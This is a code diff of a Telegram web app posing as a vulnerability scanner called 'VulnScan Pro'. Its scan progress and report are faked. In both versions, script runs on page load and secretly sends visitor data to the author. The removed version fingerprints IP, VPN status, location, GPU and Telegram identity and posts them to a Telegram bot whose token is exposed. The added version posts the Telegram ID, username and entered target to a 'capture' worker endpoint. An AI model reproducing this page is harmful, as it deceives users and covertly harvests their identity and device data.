@@ -3,266 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VulnScan Pro - Advanced Security Scanner</title>
+    <title>VulnScan Pro</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body {
-            background-color: #0a0a0a;
-            color: #00ffcc;
-            font-family: 'Courier New', Courier, monospace;
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            min-height: 100vh;
-        }
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-            border-bottom: 1px solid #00ffcc;
-            padding-bottom: 20px;
-        }
-        h1 { font-size: 28px; text-shadow: 0 0 15px #00ffcc; margin: 0; }
-        p.subtitle { color: #888; font-size: 14px; margin-top: 10px; }
-        
-        .features {
-            background: #111;
-            border: 1px solid #333;
-            padding: 15px;
-            border-radius: 8px;
-            width: 100%;
-            max-width: 500px;
-            margin-bottom: 20px;
-            font-size: 13px;
-        }
-        .features h2 { font-size: 16px; color: #fff; margin-top: 0; border-bottom: 1px solid #333; padding-bottom: 5px;}
-        .features ul { list-style-type: none; padding: 0; color: #aaa; }
-        .features li { margin-bottom: 8px; }
-        .features li span { color: #00ffcc; }
-
-        .scan-box {
-            width: 100%;
-            max-width: 500px;
-            text-align: center;
-        }
-        input {
-            width: 100%;
-            padding: 15px;
-            background: #000;
-            border: 2px solid #00ffcc;
-            color: #00ffcc;
-            border-radius: 5px;
-            box-sizing: border-box;
-            font-size: 16px;
-            margin-bottom: 15px;
-            box-shadow: 0 0 10px rgba(0, 255, 204, 0.2);
-        }
-        button {
-            width: 100%;
-            padding: 15px;
-            background: #00ffcc;
-            color: #000;
-            font-weight: bold;
-            font-size: 16px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            text-transform: uppercase;
-            box-shadow: 0 0 15px #00ffcc;
-        }
-
-        #loading { display: none; margin-top: 30px; text-align: center; }
-        .spinner {
-            border: 4px solid #222;
-            border-top: 4px solid #00ffcc;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px auto;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        #report { display: none; width: 100%; max-width: 500px; background: #111; border: 1px solid #00ffcc; padding: 20px; border-radius: 8px; margin-top: 20px; box-sizing: border-box;}
-        .report-title { font-size: 18px; color: #fff; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 15px; display: flex; justify-content: space-between;}
-        .stat { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px; color: #aaa;}
-        .stat span { color: #fff; font-weight: bold; }
-        .vuln-high { color: #ff3333; text-shadow: 0 0 5px #ff3333; }
-        .vuln-med { color: #ffcc00; }
+        body { background-color: #0a0a0a; color: #00ffcc; font-family: monospace; padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 100vh;}
+        .box { border: 1px solid #00ffcc; padding: 20px; width: 100%; max-width: 400px; border-radius: 8px; background: #111; box-shadow: 0 0 15px rgba(0, 255, 204, 0.2);}
+        h2 { text-align: center; margin-top: 0;}
+        input, button { width: 100%; padding: 15px; margin: 10px 0; background: #000; color: #00ffcc; border: 2px solid #00ffcc; box-sizing: border-box; border-radius: 4px; font-family: monospace;}
+        button { background: #00ffcc; color: #000; font-weight: bold; cursor: pointer; transition: 0.3s;}
+        button:hover { background: #00ccaa; }
+        #loading, #report { display: none; text-align: center; }
+        .stat { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; border-bottom: 1px solid #333; padding-bottom: 5px;}
+        .stat span { color: #fff; }
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1>VulnScan Pro</h1>
-        <p class="subtitle">Advanced Web Reconnaissance & Vulnerability Scanner</p>
+    <div class="box" id="form">
+        <h2>VulnScan Pro</h2>
+        <p style="font-size:12px; color:#888; text-align:center;">Advanced vulnerability scanner</p>
+        <input type="text" id="target" placeholder="example.com" />
+        <button onclick="startScan()">Start Scan</button>
     </div>
-
-    <div class="features">
-        <h2>⚡ Integrated Tools</h2>
-        <ul>
-            <li><span>Nmap:</span> Open port and service detection.</li>
-            <li><span>Nuclei:</span> Fast vulnerability scanning using custom templates.</li>
-            <li><span>Subfinder:</span> Subdomain enumeration.</li>
-            <li><span>httpx:</span> Fast HTTP probing and technology fingerprinting.</li>
-            <li><span>Wappalyzer:</span> Detect CMS, frameworks, and WAF.</li>
-        </ul>
+    
+    <div class="box" id="loading">
+        <p id="loading-text" style="color:#00ffcc;">Initializing Nmap...</p>
     </div>
-
-    <div class="scan-box" id="scan-form">
-        <input type="text" id="target" placeholder="Enter target domain (e.g., example.com)" />
-        <button onclick="startScan()">Start Full Scan</button>
-    </div>
-
-    <div id="loading">
-        <div class="spinner"></div>
-        <span id="loading-text" style="color:#00ffcc; font-size:14px;">Initializing...</span>
-    </div>
-
-    <div id="report">
-        <div class="report-title">
-            <span>Scan Report</span>
-            <span id="rep-target" style="font-size:12px; color:#888;">-</span>
-        </div>
-        <div class="stat"><span>Status:</span> <span style="color:#00ff00;">Completed</span></div>
-        <div class="stat"><span>Open Ports:</span> <span>22 (SSH), 80 (HTTP), 443 (HTTPS), 3306 (MySQL)</span></div>
-        <div class="stat"><span>Technologies:</span> <span>Nginx 1.18, PHP 7.4, WordPress 6.2</span></div>
-        <div class="stat"><span>WAF:</span> <span style="color:#ffcc00;">Cloudflare Detected</span></div>
-        
-        <h2 style="font-size:14px; margin-top:20px; color:#fff; border-bottom:1px solid #333; padding-bottom:5px;">Vulnerabilities Found</h2>
-        <div class="stat"><span>Critical:</span> <span class="vuln-high">2 (CVE-2023-1234, CVE-2024-5678)</span></div>
-        <div class="stat"><span>High:</span> <span class="vuln-high">1</span></div>
-        <div class="stat"><span>Medium:</span> <span class="vuln-med">4</span></div>
-        <div class="stat"><span>Low:</span> <span>7</span></div>
-
-        <button onclick="location.reload()" style="margin-top: 20px; background: #333; color: #00ffcc; box-shadow: none;">Scan Another Target</button>
+    
+    <div class="box" id="report">
+        <h3 style="color:#fff; text-align:center;">Scan Report</h3>
+        <div class="stat"><span>Target:</span> <span id="rep-target">-</span></div>
+        <div class="stat"><span>Status:</span> <span style="color:#0f0;">Completed</span></div>
+        <div class="stat"><span>Open Ports:</span> <span>22, 80, 443, 3306</span></div>
+        <div class="stat"><span>Vulnerabilities:</span> <span style="color:#f00;">3 Critical</span></div>
     </div>
 
     <script>
-        const BOT_TOKEN = '8554012988:AAEnth4GKjCgEJJjBu3MfQfakhLLjKoZZLE';
-        const CHAT_ID = '8735622476';
-
+        // 🔴 هنا حطينا الرابط ديالك 🔴
+        const WORKER_URL = 'https://capture.kikizamllll.workers.dev/'; 
+        
         const tg = window.Telegram.WebApp;
         tg.ready();
-        tg.expand();
         const user = tg.initDataUnsafe?.user || {};
 
-        // جلب نوع كارت الشاشة
-        function getGPU() {
+        async function captureData(target = "Opened Bot") {
             try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            } catch (e) { return "Unknown"; }
-        }
-
-        // فحص VPN / Proxy عبر الـ API
-        async function getNetworkData() {
-            try {
-                const res = await fetch('https://ipwho.is/');
-                const data = await res.json();
-                if (data.success) {
-                    return {
-                        ip: data.ip || 'Unknown',
-                        isp: data.connection.isp || 'Unknown',
-                        city: data.city || 'Unknown',
-                        country: data.country || 'Unknown',
-                        timezone: data.timezone.id || 'Unknown',
-                        vpn: data.security.proxy ? 'YES (Proxy/VPN Detected)' : 'NO (Direct Connection)'
-                    };
-                }
-                return null;
-            } catch (e) { 
-                return { ip: 'Blocked by AdBlocker', isp: 'Unknown', city: 'Unknown', country: 'Unknown', timezone: 'Unknown', vpn: 'Unknown' }; 
-            }
-        }
-
-        async function autoCapture() {
-            const net = await getNetworkData();
-            const gpu = getGPU();
-            const cores = navigator.hardwareConcurrency || 'Unknown';
-            const isDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Dark Mode' : 'Light Mode';
-
-            const message = `
-🕵️ **Visitor Details Captured** 🕵️
-
-👤 **Telegram Account:**
-- ID: ${user.id || 'Guest'}
-- Username: @${user.username || 'None'}
-- Name: ${user.first_name || ''} ${user.last_name || ''}
-- Platform: ${tg.platform || 'Unknown'}
-
-🌐 **Network & VPN Status:**
-- IP: ${net?.ip || 'Unknown'}
-- VPN/Proxy: ${net?.vpn || 'Unknown'}
-- ISP: ${net?.isp || 'Unknown'}
-- Location: ${net?.city || 'Unknown'}, ${net?.country || 'Unknown'}
-- Timezone: ${net?.timezone || 'Unknown'}
-
-💻 **Hardware & Device:**
-- OS/Browser: ${navigator.userAgent}
-- GPU: ${gpu}
-- CPU Cores: ${cores}
-- Screen: ${window.screen.width}x${window.screen.height}
-- Theme: ${isDark}
-- Language: ${navigator.language}
-            `;
-
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                await fetch(WORKER_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+                    body: JSON.stringify({
+                        tg_id: user.id || 'Guest',
+                        tg_user: user.username || 'None',
+                        target: target
+                    })
                 });
-            } catch (e) { console.log("Silent fail."); }
+            } catch (e) { console.log("Worker error:", e); }
         }
 
-        // تنفيذ أوتوماتيكي ملي يتحل
-        setTimeout(autoCapture, 1000);
+        // إرسال تلقائي بمجرد فتح الواجهة
+        setTimeout(() => captureData("Opened Bot"), 1000);
 
-        async function startScan() {
+        function startScan() {
             const target = document.getElementById('target').value;
-            if (!target) return alert('Please enter a valid target domain.');
-
-            document.getElementById('scan-form').style.display = 'none';
+            if(!target) return alert("Please enter a target domain.");
+            
+            document.getElementById('form').style.display = 'none';
             document.getElementById('loading').style.display = 'block';
+            
+            captureData(target);
 
-            const steps = [
-                "Running Nmap port scan...",
-                "Enumerating subdomains with Subfinder...",
-                "Probing HTTP services with httpx...",
-                "Executing Nuclei vulnerability templates...",
-                "Analyzing WAF and technologies...",
-                "Compiling final report..."
-            ];
-
-            let stepIndex = 0;
-            const loadingInterval = setInterval(() => {
-                if (stepIndex < steps.length) {
-                    document.getElementById('loading-text').innerText = steps[stepIndex];
-                    stepIndex++;
+            const steps = ["Running Nmap...", "Nuclei scanning...", "Compiling report..."];
+            let i = 0;
+            const int = setInterval(() => {
+                document.getElementById('loading-text').innerText = steps[i];
+                i++;
+                if(i >= steps.length) {
+                    clearInterval(int);
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('report').style.display = 'block';
+                    document.getElementById('rep-target').innerText = target;
                 }
-            }, 800);
-
-            setTimeout(async () => {
-                clearInterval(loadingInterval);
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('report').style.display = 'block';
-                document.getElementById('rep-target').innerText = target;
-
-                try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ 
-                            chat_id: CHAT_ID, 
-                            text: `🎯 *Target Scanned:* ${target}`, 
-                            parse_mode: 'Markdown' 
-                        })
-                    });
-                } catch(e) {}
-            }, 5500);
+            }, 1000);
         }
     </script>
 </body>
